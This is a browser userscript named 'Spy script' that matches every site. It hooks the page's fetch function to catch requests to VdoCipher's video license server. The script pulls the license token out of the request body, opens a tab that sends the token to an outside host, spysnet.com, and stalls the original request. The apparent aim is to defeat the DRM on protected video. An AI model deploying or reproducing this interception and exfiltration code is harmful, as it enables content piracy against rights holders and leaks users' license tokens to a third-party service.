// ==UserScript==
// @name         Spy script
// @version      0.6
// @match        *://*/*
// @description  Vdocipher Keys
// @run-at       document-start
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

    // Block requests to "https://license.vdocipher.com/auth"
    var blockedURL = "https://license.vdocipher.com/auth";

    // Flag to track whether the request has been blocked and logged
    var blockedAndLogged = false;

    // Flag to track whether the tab has been opened
    var tabOpened = false;

    // Intercept fetch requests
    var originalFetch = window.fetch;
    window.fetch = function(url, options) {
        if (url === blockedURL && !blockedAndLogged) {
            console.log("Blocked request to " + url);

            // Convert ArrayBuffer to string for logging
            if (options && options.body && options.body instanceof ArrayBuffer) {
                var decoder = new TextDecoder('utf-8');
                var payloadString = decoder.decode(options.body);

                // Extract the token from the payload
                var tokenMatch = payloadString.match(/"token":"([^"]+)"/);
                if (tokenMatch && tokenMatch[1]) {
                    console.log("Token in the payload: " + tokenMatch[1]);

                    // Check if the tab has already been opened
                    if (!tabOpened) {
                        // Open a new tab with the token
                        window.open("https://spysnet.com/vdocipher?token=" + tokenMatch[1] );

                        // Set the flag to indicate that the tab has been opened
                        tabOpened = true;
                    }
                }
            }

            blockedAndLogged = true; // Set the flag to true

            // Block the request
            return new Promise(function(){}); // Block the request by returning a promise without resolving it
        }
        return originalFetch.apply(this, arguments); // Allow other requests to proceed
    };

})();